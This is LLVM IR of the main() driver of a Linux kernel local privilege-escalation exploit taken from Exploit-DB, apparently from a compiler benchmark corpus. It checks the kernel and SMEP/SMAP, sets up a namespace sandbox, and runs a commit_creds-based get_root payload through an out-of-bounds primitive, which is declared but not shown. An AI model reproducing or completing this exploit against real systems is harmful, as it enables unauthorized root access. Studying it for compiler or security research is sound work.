; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47169.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47169.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SHELL = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [14 x i8] c"[.] starting\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"[.] checking kernel version\0A\00", align 1
@.str.2 = private unnamed_addr constant [30 x i8] c"[~] done, version looks good\0A\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"[.] checking SMEP and SMAP\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"[~] done, looks good\0A\00", align 1
@.str.5 = private unnamed_addr constant [34 x i8] c"[.] setting up namespace sandbox\0A\00", align 1
@.str.6 = private unnamed_addr constant [36 x i8] c"[~] done, namespace sandbox set up\0A\00", align 1
@.str.7 = private unnamed_addr constant [30 x i8] c"[.] commit_creds:        %lx\0A\00", align 1
@COMMIT_CREDS = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [30 x i8] c"[.] prepare_kernel_cred: %lx\0A\00", align 1
@PREPARE_KERNEL_CRED = common dso_local global i32 0, align 4
@get_root = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [27 x i8] c"[.] executing payload %lx\0A\00", align 1
@.str.10 = private unnamed_addr constant [30 x i8] c"[~] done, should be root now\0A\00", align 1
@KERNEL_BASE = common dso_local global i32 0, align 4
@XCHG_EAX_ESP_RET = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %13

9:                                                ; preds = %2
  %10 = load i8**, i8*** %5, align 8
  %11 = getelementptr inbounds i8*, i8** %10, i64 1
  %12 = load i8*, i8** %11, align 8
  store i8* %12, i8** @SHELL, align 8
  br label %13

13:                                               ; preds = %9, %2
  %14 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %16 = call i32 (...) @detect_kernel()
  %17 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  %19 = call i32 (...) @check_smep_smap()
  %20 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0))
  %22 = call i32 (...) @setup_sandbox()
  %23 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.6, i64 0, i64 0))
  %24 = load i32, i32* @COMMIT_CREDS, align 4
  %25 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0), i32 %24)
  %26 = load i32, i32* @PREPARE_KERNEL_CRED, align 4
  %27 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0), i32 %26)
  store i64 ptrtoint (i32* @get_root to i64), i64* %6, align 8
  %28 = load i64, i64* %6, align 8
  %29 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0), i64 %28)
  %30 = load i64, i64* %6, align 8
  %31 = call i32 @oob_execute(i64 %30)
  %32 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.10, i64 0, i64 0))
  %33 = call i32 (...) @check_root()
  ret i32 0
}

declare dso_local i32 @dprintf(i8*, ...) #1

declare dso_local i32 @detect_kernel(...) #1

declare dso_local i32 @check_smep_smap(...) #1

declare dso_local i32 @setup_sandbox(...) #1

declare dso_local i32 @oob_execute(i64) #1

declare dso_local i32 @check_root(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
